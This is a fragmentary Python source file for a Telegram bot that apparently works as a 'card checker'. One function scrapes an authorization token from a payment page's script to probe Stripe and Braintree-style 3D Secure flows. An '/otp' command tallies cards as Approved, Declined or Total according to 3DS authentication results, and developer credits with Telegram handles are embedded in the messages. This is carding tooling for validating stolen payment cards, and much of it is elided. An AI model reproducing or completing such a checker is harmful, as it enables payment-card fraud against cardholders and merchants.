...
def UniversalStripeChecker(ccx):
    ...
    js = response.text
    mi = re.search(r'authorization\s*:\s*["\']([^"\']+)["\']', js, re.IGNORECASE).group(
        1
    )
    ...
    car = response.json()["data"]["clientConfiguration"]["creditCard"]["threeDSecure"][
...
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>"""
    ...
    bot.edit_message_text(
        chat_id=message.chat.id, message_id=ko, text=msg, parse_mode="HTML"
    )


@bot.message_handler(
    func=lambda message: message.text.lower().startswith(".otp")
    or message.text.lower().startswith("/otp")
)
def my_ali5(message):
    message.from_user.first_name
    idt = message.from_user.id
...
[<a href="https://t.me/B">⌤</a>] 𝐃𝐞𝐯 𝐛𝐲: <a href='https://t.me/iazuh'>𝐁𝐀𝐒𝐄𝐋</a> - 🍀</strong>"""
                ...
                if (
                    "3DS Authenticate Successful" in last
                    or "3DS Authenticate Attempt Successful" in last
                ):
                    passs += 1
...
Dev! : @iazuh""",
                ...
                cm3 = types.InlineKeyboardButton(
                    f"- Approved! ✅ : [ {passsi} ] •", callback_data="x"
                )
                cm4 = types.InlineKeyboardButton(
                    f"- Declined! ❌ : [ {basli} ] •", callback_data="x"
                )
                cm5 = types.InlineKeyboardButton(
                    f"- Total! : [ {total} ] •", callback_data="x"
                )
